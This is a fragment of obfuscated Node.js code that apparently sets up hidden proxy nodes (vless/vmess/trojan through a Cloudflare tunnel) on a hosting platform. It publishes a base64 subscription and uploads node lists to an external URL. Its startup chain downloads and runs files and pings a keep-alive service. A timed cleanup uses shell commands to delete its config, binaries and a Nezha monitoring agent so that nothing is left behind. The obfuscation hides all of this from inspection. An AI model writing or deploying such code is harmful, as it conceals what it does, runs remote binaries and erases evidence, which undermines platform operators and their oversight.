_0x52a8a7=_0x2c57,_0x1466c4={'v':'2','ps':''+_0x337d5d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x52a8a7(_0x4caf63._0x775d5e),'net':'ws','type':_0x52a8a7(_0x4caf63._0x775d5e),'host':_0xdec5af,'path':_0x52a8a7(0x11b),'tls':_0x52a8a7(_0x4caf63._0x1beaab),'sni':_0xdec5af,'alpn':'','fp':_0x52a8a7(_0x4caf63._0x1293bb)},_0x278a39=_0x52a8a7(_0x4caf63._0x31a91f)+UUID+'@'+CFIP+':'+CFPORT+_0x52a8a7(_0x4caf63._0x470af2)+_0xdec5af+_0x52a8a7(_0x4caf63._0x1519db)+_0xdec5af+_0x52a8a7(_0x4caf63._0x4ede1c)+_0x337d5d+_0x52a8a7(0x12c)+Buffer['from'](JSON[_0x52a8a7(_0x4caf63._0x4ae07b)](_0x1466c4))['toString'](_0x52a8a7(0xf6))+_0x52a8a7(0xd8)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xdec5af+'&fp=firefox&type=ws&host='+_0xdec5af+_0x52a8a7(0x145)+_0x337d5d+_0x52a8a7(_0x4caf63._0x2e044b);console[_0x52a8a7(0xb8)](Buffer[_0x52a8a7(_0x4caf63._0x129101)](_0x278a39)[_0x52a8a7(0x152)](_0x52a8a7(0xf6))),fs[_0x52a8a7(_0x4caf63._0x231aeb)](subPath,Buffer['from'](_0x278a39)[_0x52a8a7(0x152)](_0x52a8a7(_0x4caf63._0x33f849))),console[_0x52a8a7(0xb8)](FILE_PATH+_0x52a8a7(_0x4caf63._0x36aca8)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3a25fa,_0x226214)=>{const _0x584dca=_0x52a8a7,_0x593f01=Buffer[_0x584dca(0xee)](_0x278a39)[_0x584dca(_0x8497c9._0x258f6a)](_0x584dca(0xf6));_0x226214[_0x584dca(_0x8497c9._0x57eed6)](_0x584dca(0x107),_0x584dca(0x126)),_0x226214[_0x584dca(0xc0)](_0x593f01);}),_0x1931fd(_0x278a39);},0x7d0);});}}async function uploadNodes(){const _0x4d65ba={_0x147b3d:0xf8,_0x528e68:0xe0,_0x226ad9:0xab,_0x2a17b6:0xb8,_0xbebcf4:0xe6,_0x52fbcb:0xa1,_0x14cfac:0x151,_0x192dfa:0xcb,_0x2508be:0xcf},_0x43b959=_0x519716;if(UPLOAD_URL&&PROJECT_URL){const _0x312c7f=PROJECT_URL+'/'+SUB_PATH,_0x487efa={'subscription':[_0x312c7f]};try{const _0x7d2d7f=await axios[_0x43b959(0xd7)](UPLOAD_URL+_0x43b959(_0x4d65ba._0x147b3d),_0x487efa,{'headers':{'Content-Type':_0x43b959(_0x4d65ba._0x528e68)}});return _0x7d2d7f&&_0x7d2d7f[_0x43b959(_0x4d65ba._0x226ad9)]===0xc8?(console[_0x43b959(_0x4d65ba._0x2a17b6)](_0x43b959(_0x4d65ba._0xbebcf4)),_0x7d2d7f):null;}catch(_0x619e21){if(_0x619e21['response']){if(_0x619e21[_0x43b959(_0x4d65ba._0x52fbcb)][_0x43b959(0xab)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x43b959(_0x4d65ba._0x14cfac)](listPath))return;const _0x587ef1=fs[_0x43b959(_0x4d65ba._0x192dfa)](listPath,'utf-8'),_0xc96afa=_0x587ef1[_0x43b959(0x119)]('\x0a')[_0x43b959(_0x4d65ba._0x2508be)](_0x453615=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x43b959(0xda)](_0x453615));if(_0xc96afa[_0x43b959(0xb2)]===0x0)return;const _0x288df1=JSON[_0x43b959(0x10d)]({'nodes':_0xc96afa});try{const _0x5ae2c9=await axios[_0x43b959(0xd7)](UPLOAD_URL+'/api/add-nodes',_0x288df1,{'headers':{'Content-Type':_0x43b959(0xe0)}});return _0x5ae2c9&&_0x5ae2c9['status']===0xc8?(console[_0x43b959(0xb8)]('Nodes\x20uploaded\x20successfully'),_0x5ae2c9):null;}catch(_0x1b54d3){return null;}}else return;}}function cleanFiles(){const _0x2a1736={_0x1610fe:0x10f,_0x1cc402:0xd2,_0x109c56:0xa5,_0x3699e3:0xa3},_0x5f0476={_0x4518e1:0xd1,_0x5d1d22:0xf1,_0x19f369:0xb8,_0x21b4ba:0xc7},_0xf0e975={_0xf839e3:0xd1,_0x1d91be:0xb8,_0x5c059c:0xb8};setTimeout(()=>{const _0x130f97=_0x2c57,_0x4977f8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4977f8[_0x130f97(0x139)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4977f8[_0x130f97(0x139)](phpPath);process[_0x130f97(_0x2a1736._0x1610fe)]===_0x130f97(_0x2a1736._0x1cc402)?exec(_0x130f97(_0x2a1736._0x109c56)+_0x4977f8[_0x130f97(0xcc)]('\x20')+_0x130f97(0x146),_0x3224b3=>{const _0x42e199=_0x130f97;console[_0x42e199(_0xf0e975._0xf839e3)](),console[_0x42e199(_0xf0e975._0x1d91be)](_0x42e199(0xf1)),console[_0x42e199(_0xf0e975._0x5c059c)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x130f97(0x14b)+_0x4977f8[_0x130f97(0xcc)]('\x20')+_0x130f97(_0x2a1736._0x3699e3),_0x19b9fa=>{const _0x4798df=_0x130f97;console[_0x4798df(_0x5f0476._0x4518e1)](),console['log'](_0x4798df(_0x5f0476._0x5d1d22)),console[_0x4798df(_0x5f0476._0x19f369)](_0x4798df(_0x5f0476._0x21b4ba));});},0x15f90);}function _0x2c57(_0x2a5d24,_0x3d8ee6){const _0x4f818e=_0x4f81();return _0x2c57=function(_0x2c57d0,_0x32fa40){_0x2c57d0=_0x2c57d0-0x91;let _0x59b4c5=_0x4f818e[_0x2c57d0];return _0x59b4c5;},_0x2c57(_0x2a5d24,_0x3d8ee6);}cleanFiles();async function AddVisitTask(){const _0x5a1d8e={_0x12de67:0xe2,_0x46a1a6:0xd7,_0x56fdb4:0xb8,_0xa86866:0xa9},_0x458a75=_0x519716;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x458a75(_0x5a1d8e._0x12de67));return;}try{const _0x69a429=await axios[_0x458a75(_0x5a1d8e._0x46a1a6)](_0x458a75(0xd6),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x458a75(_0x5a1d8e._0x56fdb4)](_0x458a75(0x12d)),_0x69a429;}catch(_0x4202b5){return console[_0x458a75(0xc3)](_0x458a75(_0x5a1d8e._0xa86866)+_0x4202b5[_0x458a75(0xca)]),null;}}async function startserver(){const _0x259b3e={_0x5c06f6:0x14f},_0x11992f=_0x519716;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x59a3a7){console[_0x11992f(0xc3)](_0x11992f(_0x259b3e._0x5c06f6),_0x59a3a7);}}startserver()[_0x519716(0xd5)](_0xfb319f=>{const _0x32d2c5=_0x519716;console['error'](_0x32d2c5(0xa6),_0xfb319f);}),app[_0x519716(0x101)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
